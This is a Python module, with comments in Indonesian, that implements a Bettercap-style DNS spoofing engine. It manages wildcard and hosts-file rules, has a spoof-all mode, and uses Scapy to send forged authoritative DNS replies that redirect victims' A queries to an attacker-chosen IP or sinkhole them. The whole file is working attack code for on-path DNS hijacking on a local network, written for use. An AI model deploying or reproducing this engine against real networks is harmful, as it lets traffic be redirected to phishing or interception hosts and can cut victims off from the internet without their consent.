#!/usr/bin/env python3
"""
Bettercap-Style Dynamic DNS Spoofing Engine
===========================================
Engine DNS Spoofing terinspirasi dari modul Bettercap `dns.spoof`:
- Mendukung pemetaan wildcard (*.domain.com) dan exact match domain
- Resolusi forged DNSRR ke IP penyerang/portal atau sinkhole
- Thread-safe rule management & dynamic update saat runtime
- Logging real-time hit counter dan event callback
"""

import time
import socket
import threading
import fnmatch
from typing import Dict, Any, List, Optional, Callable
from dataclasses import dataclass, asdict
from scapy.all import Ether, IP, UDP, DNS, DNSQR, DNSRR, sendp

from ...utils.logger import logger


@dataclass
class DnsSpoofRule:
    id: str
    domain: str
    target_ip: str
    action: str = "spoof"  # 'spoof' | 'sinkhole' | 'pass'
    is_enabled: bool = True
    hits: int = 0
    created_at: float = 0.0
    # True untuk entri hosts-file: cocok domain persis DAN subdomainnya
    # (meniru perilaku suffix HostEntry.Matches bettercap). Rule manual = False.
    match_subdomains: bool = False

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


class BettercapDNSEngine:
    """Engine DNS Spoofing dinamis dengan pencocokan aturan berbasis pola wildcard."""

    def __init__(self, on_spoof_callback: Optional[Callable[[Dict[str, Any]], None]] = None):
        self._rules: Dict[str, DnsSpoofRule] = {}
        self._lock = threading.RLock()
        self.on_spoof_callback = on_spoof_callback

        # Fitur gaya bettercap: spoof-all (dns.spoof.all) & TTL (dns.spoof.ttl)
        self.spoof_all_enabled = False   # OFF default (opt-in; bisa memutus internet korban)
        self.spoof_all_address = ""
        self.default_ttl = 10            # TTL jawaban DNS palsu (detik)

        # Tambahkan default rules contoh jika diperlukan
        self._init_default_rules()

    # ===== Fitur port dari bettercap dns.spoof =====

    def set_spoof_all(self, enabled: bool, address: str = "") -> Dict[str, Any]:
        """
        Aktifkan catch-all (dns.spoof.all): palsukan SEMUA domain ke satu IP.
        OPT-IN & default OFF — hati-hati, bisa memutus akses internet korban.
        """
        with self._lock:
            self.spoof_all_enabled = bool(enabled)
            if address:
                self.spoof_all_address = address.strip()
        logger.info(f"🌐 [Bettercap DNS] spoof-all = {self.spoof_all_enabled} (address='{self.spoof_all_address}')")
        return {"spoof_all_enabled": self.spoof_all_enabled, "spoof_all_address": self.spoof_all_address}

    def set_default_ttl(self, ttl: int) -> int:
        """Set TTL jawaban DNS palsu (dns.spoof.ttl), di-clamp 1..86400 detik."""
        with self._lock:
            self.default_ttl = max(1, min(86400, int(ttl)))
        logger.info(f"⏱️ [Bettercap DNS] default TTL = {self.default_ttl}s")
        return self.default_ttl

    def _parse_hosts_lines(self, lines, default_address: str, action: str = "spoof") -> int:
        """
        Parser daftar domain (format hosts-file bettercap):
        - lewati baris kosong / diawali '#'
        - split whitespace jadi <=2 bagian: 'IP domain' -> (IP, domain);
          token tunggal 'domain' -> (default_address, domain)
        - buat rule dengan match_subdomains=True.
        action='sinkhole' (blokir) -> target diabaikan (dijawab 0.0.0.0); 'spoof' -> ke IP.
        Return jumlah rule yang dimuat.
        """
        loaded = 0
        for raw in lines:
            line = raw.strip()
            if not line or line.startswith('#'):
                continue
            parts = line.split(None, 1)  # whitespace splitter, maks 2
            if len(parts) == 2:
                address, domain = parts[0].strip(), parts[1].strip()
            else:
                address, domain = (default_address or "").strip(), parts[0].strip()
            # Mode blokir: IP tidak wajib (dijawab 0.0.0.0 di process_dns_query).
            if action == "sinkhole" and not address:
                address = "0.0.0.0"
            if not domain or not address:
                continue
            rid = f"rule-hosts-{int(time.time() * 1000)}-{loaded + 1}"
            with self._lock:
                self._rules[rid] = DnsSpoofRule(
                    id=rid,
                    domain=domain.lower().lstrip("*."),  # simpan basis; suffix ditangani match_subdomains
                    target_ip=address,
                    action=action,
                    is_enabled=True,
                    created_at=time.time(),
                    match_subdomains=True
                )
            loaded += 1
        logger.info(f"📄 [Bettercap DNS] Memuat {loaded} entri (action={action}).")
        return loaded

    def load_hosts_content(self, content: str, default_address: str = "", action: str = "spoof") -> int:
        """Muat daftar domain dari string. action='sinkhole' untuk blokir."""
        return self._parse_hosts_lines((content or "").splitlines(), default_address, action)

    def load_hosts_file(self, path: str, default_address: str = "", action: str = "spoof") -> int:
        """Muat daftar domain dari file. action='sinkhole' untuk blokir."""
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                return self._parse_hosts_lines(f.readlines(), default_address, action)
        except Exception as e:
            logger.warning(f"⚠️ [Bettercap DNS] Gagal membaca file '{path}': {e}")
            return 0

    def _init_default_rules(self):
        default_rule = DnsSpoofRule(
            id="rule-default-1",
            domain="*.captive.local",
            target_ip="192.168.1.1",
            action="spoof",
            is_enabled=True,
            created_at=time.time()
        )
        self._rules[default_rule.id] = default_rule

    def add_rule(self, domain: str, target_ip: str, action: str = "spoof", is_enabled: bool = True) -> DnsSpoofRule:
        rule_id = f"rule-{int(time.time() * 1000)}-{len(self._rules) + 1}"
        rule = DnsSpoofRule(
            id=rule_id,
            domain=domain.strip().lower(),
            target_ip=target_ip.strip(),
            action=action,
            is_enabled=is_enabled,
            created_at=time.time()
        )
        with self._lock:
            self._rules[rule_id] = rule
        logger.info(f"🎯 [Bettercap DNS] Added rule: {domain} -> {target_ip} ({action})")
        return rule

    def update_rule(self, rule_id: str, domain: Optional[str] = None, target_ip: Optional[str] = None, action: Optional[str] = None, is_enabled: Optional[bool] = None) -> Optional[DnsSpoofRule]:
        with self._lock:
            rule = self._rules.get(rule_id)
            if not rule:
                return None
            if domain is not None:
                rule.domain = domain.strip().lower()
            if target_ip is not None:
                rule.target_ip = target_ip.strip()
            if action is not None:
                rule.action = action
            if is_enabled is not None:
                rule.is_enabled = is_enabled
            return rule

    def delete_rule(self, rule_id: str) -> bool:
        with self._lock:
            if rule_id in self._rules:
                del self._rules[rule_id]
                logger.info(f"🗑️ [Bettercap DNS] Deleted rule {rule_id}")
                return True
            return False

    def get_all_rules(self) -> List[Dict[str, Any]]:
        with self._lock:
            return [rule.to_dict() for rule in self._rules.values()]

    def match_domain(self, domain: str) -> Optional[DnsSpoofRule]:
        """Cari aturan yang cocok dengan nama domain (mendukung wildcard seperti *.example.com)."""
        d = domain.lower().rstrip(".")
        with self._lock:
            for rule in self._rules.values():
                if not rule.is_enabled:
                    continue
                pattern = rule.domain.lower().rstrip(".")
                # Exact match atau wildcard match
                if pattern.startswith("*."):
                    base = pattern[2:]
                    if d == base or d.endswith("." + base) or fnmatch.fnmatch(d, pattern):
                        return rule
                elif rule.match_subdomains:
                    # Entri hosts-file: cocok domain persis DAN subdomain (suffix), ala bettercap.
                    if d == pattern or d.endswith("." + pattern):
                        return rule
                elif fnmatch.fnmatch(d, pattern) or d == pattern:
                    return rule
        return None

    def _make_spoof_all_rule(self, default_redirect_ip: str) -> Optional[DnsSpoofRule]:
        """Rule sintetis catch-all bila spoof-all aktif (dns.spoof.all)."""
        if not self.spoof_all_enabled:
            return None
        addr = self.spoof_all_address or default_redirect_ip
        if not addr:
            return None
        return DnsSpoofRule(
            id="rule-spoof-all",
            domain="*",
            target_ip=addr,
            action="spoof",
            is_enabled=True,
            created_at=time.time()
        )

    def process_dns_query(self, pkt, client_ip: str, client_mac: str, self_mac: str, interface: Any, default_redirect_ip: str) -> bool:
        """
        Evaluasi paket DNS query UDP 53 dan lakukan injeksi forged response jika rule cocok.
        Mengembalikan True jika paket di-spoof/ditangani, False jika dilewati.
        """
        if not pkt.haslayer(DNS) or not pkt.haslayer(DNSQR):
            return False

        dns = pkt[DNS]
        if dns.qr != 0 or dns.opcode != 0:
            return False

        try:
            qname = dns[DNSQR].qname.decode("utf-8", errors="ignore").rstrip(".")
            qtype = dns[DNSQR].qtype

            # Hanya proses query A (IPv4 = type 1) atau AAAA (IPv6 = type 28)
            if qtype not in (1, 28):
                return False

            matched_rule = self.match_domain(qname)
            if not matched_rule:
                # Fallback catch-all bettercap (dns.spoof.all) bila diaktifkan.
                matched_rule = self._make_spoof_all_rule(default_redirect_ip)
                if not matched_rule:
                    return False

            # Tingkatkan hit counter (rule sintetis spoof-all tidak disimpan, jadi aman)
            with self._lock:
                matched_rule.hits += 1

            now_ts = time.time()
            spoofed_ip = matched_rule.target_ip if matched_rule.action == "spoof" else "0.0.0.0"
            if matched_rule.action == "spoof" and not spoofed_ip:
                spoofed_ip = default_redirect_ip

            # Buat forged DNS response
            if qtype == 1:  # Type A IPv4
                dns_resp = (
                    Ether(dst=client_mac, src=self_mac) /
                    IP(src=pkt[IP].dst, dst=client_ip) /
                    UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) /
                    DNS(
                        id=dns.id,
                        qr=1,
                        aa=1,
                        rd=dns.rd,
                        ra=1,
                        qd=dns.qd,
                        an=DNSRR(rrname=dns[DNSQR].qname, type="A", ttl=self.default_ttl, rdata=spoofed_ip)
                    )
                )
                sendp(dns_resp, iface=interface, verbose=False)
            elif qtype == 28:  # Type AAAA IPv6 -> kosongkan atau rcode NXDOMAIN agar fallback cepat ke IPv4
                dns_resp = (
                    Ether(dst=client_mac, src=self_mac) /
                    IP(src=pkt[IP].dst, dst=client_ip) /
                    UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) /
                    DNS(
                        id=dns.id,
                        qr=1,
                        aa=1,
                        rd=dns.rd,
                        ra=1,
                        rcode=3 if matched_rule.action == "sinkhole" else 0,
                        qd=dns.qd
                    )
                )
                sendp(dns_resp, iface=interface, verbose=False)

            log_entry = {
                "id": f"dns-spoof-{int(now_ts * 1000)}",
                "timestamp": now_ts,
                "client_ip": client_ip,
                "domain": qname,
                "resolved_ip": spoofed_ip,
                "action": matched_rule.action,
                "rule_id": matched_rule.id
            }

            logger.info(f"🎯 [Bettercap DNS Spoof] Forged {qname} -> {spoofed_ip} for {client_ip} (Rule: {matched_rule.domain})")

            if self.on_spoof_callback:
                try:
                    self.on_spoof_callback(log_entry)
                except Exception as cb_err:
                    logger.debug(f"Notice in DNS spoof callback: {cb_err}")

            return True

        except Exception as e:
            logger.debug(f"Error processing Bettercap DNS query: {e}")
            return False
